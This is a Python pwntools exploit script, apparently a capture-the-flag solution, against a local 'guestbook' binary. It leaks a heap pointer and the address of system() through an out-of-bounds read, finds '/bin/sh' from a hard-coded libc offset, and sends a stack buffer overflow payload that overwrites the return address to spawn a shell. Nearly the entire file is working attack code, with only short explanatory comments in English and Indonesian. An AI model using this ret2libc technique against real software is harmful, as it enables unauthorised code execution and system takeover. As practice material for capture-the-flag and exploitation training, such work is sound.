from pwn import *

p = process(['./guestbook_patched'])

elf = ELF('./guestbook_patched',checksec=False)
libc = ELF('./libc.so.6',checksec=False)

# context.log_level = 'debug'

def leak():
    p.sendlineafter(b">>",b'1')
    p.sendlineafter(b">>>",b'6') # point to stack that point to array contain heap to our input and system addr
    leaks = p.recv(24)
    system = u32(leaks[20:24])
    heap = u32(leaks[0:4])
    return system, heap
    
p.sendlineafter(b">>>",b'A'*4)
p.sendlineafter(b">>>",b'B'*4)
p.sendlineafter(b">>>",b'C'*4)
p.sendlineafter(b">>>",b'D'*4)

system, heap = leak()

# Searching '/bin/sh' in memory
# 0xf7f77a0b - 0xf7f77a12  â†’   "/bin/sh" 
# system on stack
# 0xf7e56da0
# offset 0xf7f77a0b - 0xf7e56da0 = 0x120c6b

binsh = system + 0x120c6b

# Since our payload will overflow some address that refer to call strcpy, we need to make it 'valid' so program not crash
# we can put leaked heap pointer to that place
# the offset is 108 = 100 + 4 + 4
# char payload_overflow [100];
# int index;
# int pilihan;
# char *stored_value [4];

payload = b'A'*100
payload += p32(0x0) # index pilihan, yang mau di strcpy
payload += p32(2) # pilihan edit 2
payload += p32(heap) # so program not crash
payload += b'B'*44 # 2nd offset to reach return address
payload += p32(system)
payload += b'C'* 4 # 3rd junk to ret addres
payload += p32(binsh)

# gdb.attach(p,gdbscript="""init-gef""")

p.sendlineafter(b'>>',b'2')
p.sendlineafter(b'>>>',b'0')
p.sendlineafter(b'>>>',payload)
p.sendline()
p.sendlineafter(b'>>',b'3') # quit to return

p.interactive()